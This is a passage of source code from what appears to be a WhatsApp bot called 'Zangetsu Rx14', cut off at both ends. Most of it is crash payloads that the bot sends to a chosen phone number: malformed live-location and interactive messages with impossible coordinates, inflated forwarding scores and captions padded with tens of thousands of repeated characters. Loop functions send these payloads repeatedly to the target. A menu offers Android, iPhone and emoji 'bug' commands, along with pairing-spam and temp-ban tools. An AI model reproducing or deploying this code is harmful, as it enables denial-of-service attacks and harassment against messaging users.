							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " X ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " X "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: " ⌜ MargaAlways ⌟",
								body: " ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " x ",
								sourceId: " x ",
								sourceUrl: "https://youtube.com/@faxz.attacker",
								mediaUrl: "https://youtube.com/@faxz.attacker",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "https://youtube.com/@faxz.attacker"
							},
							groupSubject: " X ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " X ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " X ",
								utmCampaign: " X "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " X ",
								contentType: "UPDATE",
								accessibilityText: " X "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By Zangetsuzehpyh"));
		};

		async function TxIos(X, Ptcp = false) {
			await TheFaxz.relayMessage(X, {
					"extendedTextMessage": {
						"text": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "6282311435959@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "6282311435959@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": X,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6282311435959@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": " ⌜ MargaAlways ⌟",
								"body": " ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/abcdefaxz4you",
								"mediaUrl": "https://www.instagram.com/abcdefaxz4you",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/abcdefaxz4you"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

async function frezebug(jid, count) {
                for (let i = 0; i < count; i++) {
                await bug7(jid)
                await sendQP(jid)
                await bug2(jid)
                await BLEKING(jid)
                await await bug1(jid)
                await PayMent(jid)
                await LIVELOK(jid)
                await VIRDOK(jid)
                await sendSessionStructure(jid)
                await PIRGO(jid)
                await LiveLok(jid)
                await sendListMessage(jid)
                await ngeloc(jid)
                await ngeloc(jid)
                await ngeloc(jid)
                await bug7(jid)
                await sendQP(jid)
                await bug2(jid)
                await BLEKING(jid)
                await bug1(jid)
                await PayMent(jid)
                await LIVELOK(jid)
                await VIRDOK(jid)
                await sendSessionStructure(jid)
                await PIRGO(jid)
                await LiveLok(jid)
                await sendListMessage(jid)
                await ngeloc(jid)
                await ngeloc(jid)
                await ngeloc(jid)
                }
                }
                
                async function XsVLoc(X) {
  var messageContent = generateWAMessageFromContent(X, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': ' ⟅̊༑ ▾ ⌜ ☠ zangetsu ☠ ⌟ ▾ ༑̴⟆̊‌‏' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': X
  });
  
  await TheFaxz.relayMessage(X, messageContent.message, {
    'participant': {
      'jid': X
    },
    'messageId': messageContent.key.id
  });
}
         
                async function NuLLxLoCx(X, Qtd, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̊‌‏" + "ꦾ".repeat(77777),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "zangetsu🔥",
										"address": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 🔥zangetsu メ MargaAlways🔥 ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
												"sections": [{
													"title": " ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);
			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

  async function NuLLxLocFxZ(X, Qtd, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: " ⟅̊༑ ▾ ⌜ Zangetsu Rx14⌟ ▾ ༑̴⟆̊‌‏" + "ꦾိိိ့".repeat(77777),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "zangetsu⚡",
										"address": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 🔥Zangetsu Rx14🔥 ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
												"sections": [{
													"title": " ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);
			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By Zangetsu Rx14🔥"));
		};
		
		
// ----( RACIKAN INFINITYLOCMIX )----
async function VxEtC(X, count) {
  for (let i = 0; i < count; i++) {
    XsVLoc(X);
    XsVLoc(X);
    XsVLoc(X);
    await sleep(500);
  }
}



// Fucn TheFaxzReply load
async function loading () {
var genalpa = [
`*⟅̊༑ ▾ ⌜ × ⌟ ▾ ༑̴⟆̊*`,
`*⟅̊༑ ▾ ⌜ + ⌟ ▾ ༑̴⟆̊*`,
`*⟅̊༑ ▾ ⌜ × ⌟ ▾ ༑̴⟆̊*`,
`*⟅̊༑ ▾ ⌜ + ⌟ ▾ ༑̴⟆̊*`,
`*⟅̊༑ ▾ ⌜ Zangetsu Rx14 ⌟ ▾ ༑̴⟆̊*`
]
let { key } = await TheFaxz.sendMessage(m.chat, {text: '*⟅̊༑ ▾ ⌜ ★ ⌟ ▾ ༑̴⟆*'})//Pengalih isu

for (let i = 0; i < genalpa.length; i++) {
/*await delay(10)*/
await TheFaxz.sendMessage(m.chat, {text: genalpa[i], edit: key });//PESAN LEPAS
}
}
// Function TheFaxzReply
const TheFaxzReply = async (teks) => {
	    TheFaxz.sendMessage(from, { text:teks, contextInfo: {externalAdReply : {
        title : `⟅̊༑ ▾ ⌜ Zangetsu Rx14 ⌟ ▾ ༑̴⟆̊`,
        body : ` ⌜ ☠メ-Zangetsu Rx14 4.0☠ ⌟ `,
        renderLargerThumbnail:false,
        showAdAttribution: true, 
        mediaUrl: `https://whatsapp.com/channel/0029Vamo6AZ002TD5ECrqv1N`,
        mediaType: 2, 
        thumbnail:YcXç
        }}}, { quoted: qpay })}

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const FAXZxCRASH = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			message: {
				listResponseMessage: {
					title: `⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊`
				}
			}
		}
		async function prM(params) {
			return await prepareWAMessageMedia(params, {
				upload: TheFaxz.waUploadToServer
			})
		}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Botz By  ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/342162094e5a96fa45d47.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

               // Buat Thumbnail \\
const images = ["https://files.catbox.moe/zh0vro.jpg"];

		function getRandomImage() {
			const randomIndex = Math.floor(Math.random() * images.length);
			return images[randomIndex];
		}
		const thumburl = getRandomImage()
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
TheFaxz.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
TheFaxz.groupParticipantsUpdate(m.chat, [sender], 'remove')
TheFaxz.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {
case 'menu': {
let UeYxzZe = `> *${hariini} || ${wib}*\n> *${ucapanWaktu},${pushname}*\n\n*👋 hello ${pushname}, Can I Help You?*

       *☠ Welcome In Zangetsu Rx14*

*၇ Your Name : ${pushname}*
*၇ Bot Name : Zangetsu Rx14*
*၇ Bot Version : 4.0.0*
*၇ Platfrom : ( Chrome ) Ubuntu*
*၇ Runtime : ${runtime(process.uptime())}*

*<!> Bot By zehpyh <!>*
_Çrêàtør Înførmâtîøns_
-> Telegram
> https://t.me/Zehpyh

💀 *Welcome* 💀

> *[ _Owner & Other Access_ ]*
*-> Other Menu*
> *၇ public*
> *၇ self*
> *၇ s*
> *၇ enc*
> *၇ rvo*
> *၇ addowner*
> *၇ delowner*
> *၇ addprem*
> *၇ delprem*
> *၇ spampair*
> *၇ tempban*
> *၇ s*
> *၇ rvo*
> *၇ linkgc*
> *၇ kick*
> *၇ hidetag*

> *[ _Owner & Premium Access_ ]*
*-> Bug Menu*
> *# Andro Bug*
> *၇ betamix 628xxx*
> *၇ extremenotif 628xxx*
> *၇ extremenotifv2 628xxx*
> *၇ betanewmix 628xxx*
> *၇ Xbeta 628xxx*
> *၇ Hardui 628xxx*
> *၇ uzoph 628xxx*
> *၇ Vx 628xxx*
> *၇ OlxCtrL 628xxx*
> *၇ OverSpy 628xxx*
> *၇ jext 628xxx*
> *၇ X-Vrtx 628xxx*
> *၇ X-ion 628xxx*
> *၇ GlxCall 628xxx*

> *# Iphone Bug*
> *၇ X-ip 628xxx*
> *၇ Z-ip 628xxx*

> *# Emoji Bug*
> *၇ 💀 628xxx*
> *၇ ⚡ 628xxx*
> *၇ 👋 628xxx*

> © Powered By Zangetsuzehpyh`
await TheFaxz.sendMessage(m.chat, {image: {url: thumburl}, caption: UeYxzZe}, {quoted: m})
await TheFaxz.sendMessage(m.chat, {audio: fs.readFileSync('./all/Xxvip.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'zangetsu': {
await loading()
let UeYxzZeO = `> *${hariini} || ${wib}*\n> *${ucapanWaktu},${pushname}*\n\n*👋 hello ${pushname}, Can I Help You?*

       *Welcome In Zangetsu Rx14*

*၇ Your Name : ${pushname}*
*၇ Bot Name : Zangetsu Rx14*
*၇ Bot Version : 4.0.0*
*၇ Platfrom : ( Chrome ) Ubuntu*
*၇ Runtime : ${runtime(process.uptime())}*

*<!> Bot By zehpyh <!>*
_Çrêàtør Înførmâtîøns_
-> Telegram
> https://t.me/Zehpyh

        💀 *Welcome* 💀

> *[ _Owner & Other Access_ ]*
*-> Other Menu*
> *၇ public*
> *၇ self*
> *၇ s*
> *၇ enc*
> *၇ rvo*
> *၇ addowner*
> *၇ delowner*
> *၇ addprem*
> *၇ delprem*
> *၇ spampair*
> *၇ tempban*
> *၇ s*
> *၇ rvo*
> *၇ linkgc*
> *၇ kick*
> *၇ hidetag*

> *[ _Owner & Premium Access_ ]*
*-> Bug Menu*
> *# Andro Bug*
> *၇ betamix 628xxx*
> *၇ extremenotif 628xxx*
> *၇ extremenotifv2 628xxx*
> *၇ betanewmix 628xxx*
> *၇ Xbeta 628xxx*
> *၇ Hardui 628xxx*
> *၇ uzoph 628xxx*
> *၇ Vx 628xxx*
> *၇ OlxCtrL 628xxx*
> *၇ OverSpy 628xxx*
> *၇ jext 628xxx*
> *၇ X-Vrtx 628xxx*
> *၇ X-ion 628xxx*
> *၇ GlxCall 628xxx*

> *# Iphone Bug*
> *၇ X-ip 628xxx*
> *၇ Z-ip 628xxx*

> *# Emoji Bug*
> *၇ 💀 628xxx*
> *၇ ⚡ 628xxx*
> *၇ 👋 628xxx*

> © Powered By Zangetsuzehpyh`
await TheFaxz.sendMessage(m.chat, {image: {url: thumburl}, caption: UeYxzZeO}, {quoted: m})
await TheFaxz.sendMessage(m.chat, {audio: fs.readFileSync('./all/Xxvip.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case "sticker": case "s": {
if (!quoted) return TheFaxzReply(`Kirim/TheFaxzReply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await TheFaxz.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return TheFaxzReply('Kirim/TheFaxzReply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await TheFaxz.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
TheFaxzReply(`Kirim/TheFaxzReply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case "ht": case "hidetag": {
if (!isGroup) return TheFaxzReply(mess.only.group)
if (!isAdmins && !isOwner) return TheFaxzReply(mess.only.admin)
if (!isBotAdmins) return TheFaxzReply(mess.only.badmin)
if (!q) return TheFaxzReply(`Teks?`)
global.hit = q
